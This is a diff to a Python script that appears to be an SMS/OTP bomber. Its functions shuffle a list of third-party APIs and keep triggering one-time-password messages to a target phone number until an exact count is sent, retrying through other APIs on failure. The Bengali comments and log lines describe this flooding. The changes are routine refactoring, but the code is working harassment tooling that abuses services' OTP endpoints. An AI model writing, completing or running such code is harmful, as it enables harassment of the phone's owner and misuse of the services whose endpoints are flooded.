@@ -1,7 +1,14 @@
-import requests, random, time
+import requests
+import random
+import time
 from apis import APIS
 
-def send_one(phone):
+
+def send_one(phone: str) -> bool:
+    """
+    Try all APIs randomly.
+    Return True if ANY api reports success.
+    """
     apis = APIS.copy()
     random.shuffle(apis)
 
@@ -14,24 +21,30 @@ def send_one(phone):
                 timeout=10
             )
             if api["success"](r):
-                return True, api["name"]
+                return True
         except:
             pass
 
-    return False, None
+    return False
 
 
-def send_exact(phone, total, delay):
+def send_exact(phone: str, total: int, delay: float):
+    """
+    Send EXACT number of OTP.
+    Fail হলে retry করবে অন্য API দিয়ে,
+    total এর বেশি কখনো পাঠাবে না।
+    """
     sent = 0
     logs = []
 
     while sent < total:
-        ok, api = send_one(phone)
+        ok = send_one(phone)
+
         if ok:
             sent += 1
-            logs.append(f"✅ {sent}/{total} via {api}")
+            logs.append(f"✅ {sent}/{total} OTP SENT (TRUE)")
         else:
-            logs.append("❌ All API failed")
+            logs.append(f"❌ {sent+1}/{total} OTP FAILED (FALSE)")
 
         time.sleep(delay)
 
